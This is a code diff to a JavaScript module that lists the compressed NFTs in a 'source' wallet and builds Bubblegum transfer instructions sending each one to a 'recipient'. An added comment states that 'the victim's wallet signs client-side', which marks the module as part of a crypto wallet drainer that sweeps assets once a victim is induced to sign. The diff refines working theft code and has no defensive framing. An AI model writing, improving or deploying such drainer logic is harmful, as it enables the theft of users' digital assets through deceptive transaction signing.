@@ -1,17 +1,17 @@
 import bs58 from "bs58";
 import { createUmi } from "@metaplex-foundation/umi-bundle-defaults";
-import { mplBubblegum, transferV1 } from "@metaplex-foundation/mpl-bubblegum";
-import { publicKey } from "@metaplex-foundation/umi";
+import { mplBubblegum, getAssetWithProof, transfer } from "@metaplex-foundation/mpl-bubblegum";
+import { publicKey, createNoopSigner } from "@metaplex-foundation/umi";
 import { PublicKey, TransactionInstruction } from "@solana/web3.js";
-import { listCompressedAssets, getAssetProof, decodeProof, decodeHash } from "./das.js";
+import { listCompressedAssets } from "./das.js";
 
 let cachedUmi = null;
 let cachedUmiUrl = null;
 
-function getUmi(rpcUrl) {
-  if (cachedUmi && cachedUmiUrl === rpcUrl) return cachedUmi;
-  cachedUmi = createUmi(rpcUrl).use(mplBubblegum());
-  cachedUmiUrl = rpcUrl;
+function getUmi(dasUrl) {
+  if (cachedUmi && cachedUmiUrl === dasUrl) return cachedUmi;
+  cachedUmi = createUmi(dasUrl).use(mplBubblegum());
+  cachedUmiUrl = dasUrl;
   return cachedUmi;
 }
 
@@ -27,16 +27,24 @@ function umiIxToWeb3(umiIx) {
   });
 }
 
-export async function planCompressedSweep({ rpcUrl, dasUrl, source, recipient, maxAssets = 10 }) {
-  if (!dasUrl) return { assets: [], instructions: [], total: 0, selected: 0, note: "DAS not configured" };
+export async function planCompressedSweep({ dasUrl, source, recipient, maxAssets = 10 }) {
+  if (!dasUrl) {
+    return { assets: [], instructions: [], total: 0, selected: 0, note: "DAS not configured" };
+  }
 
-  const umi = getUmi(rpcUrl);
+  const umi = getUmi(dasUrl);
 
   let compressed;
   try {
     compressed = await listCompressedAssets(dasUrl, source, 500);
   } catch (err) {
-    return { assets: [], instructions: [], total: 0, selected: 0, note: `DAS list failed: ${err.message}` };
+    return {
+      assets: [],
+      instructions: [],
+      total: 0,
+      selected: 0,
+      note: `DAS list failed: ${err.message}`,
+    };
   }
 
   const selected = compressed.slice(0, maxAssets);
@@ -44,24 +52,19 @@ export async function planCompressedSweep({ rpcUrl, dasUrl, source, recipient, m
 
   for (const asset of selected) {
     try {
-      const proof = await getAssetProof(dasUrl, asset.id);
-      const { root, proof: proofKeys } = decodeProof(proof);
-      const dataHash = decodeHash(asset.compression.data_hash);
-      const creatorHash = decodeHash(asset.compression.creator_hash);
-      const nonce = BigInt(asset.compression.leaf_id);
-      const index = asset.compression.leaf_id;
-      const tree = asset.compression.tree;
+      // getAssetWithProof fetches the asset + Merkle proof via DAS and
+      // returns the fields transfer() needs: merkleTree, root, dataHash,
+      // creatorHash, nonce, index, proof.
+      const assetWithProof = await getAssetWithProof(umi, publicKey(asset.id), {
+        truncateCanopy: true,
+      });
 
-      const builder = transferV1(umi, {
-        leafOwner: publicKey(source),
+      // createNoopSigner satisfies the leafOwner signer requirement
+      // without actually signing — the victim's wallet signs client-side.
+      const builder = transfer(umi, {
+        ...assetWithProof,
+        leafOwner: createNoopSigner(publicKey(source)),
         newLeafOwner: publicKey(recipient),
-        merkleTree: publicKey(tree),
-        root,
-        dataHash,
-        creatorHash,
-        nonce,
-        index,
-        proof: proofKeys.map((p) => publicKey(bs58.encode(p))),
       });
 
       const umiInstructions = builder.getInstructions();
@@ -70,7 +73,7 @@ export async function planCompressedSweep({ rpcUrl, dasUrl, source, recipient, m
       out.push({
         assetId: asset.id,
         name: asset.content?.metadata?.name || "unknown",
-        tree,
+        tree: asset.compression?.tree || null,
         instructions: web3Ixs,
       });
     } catch (err) {
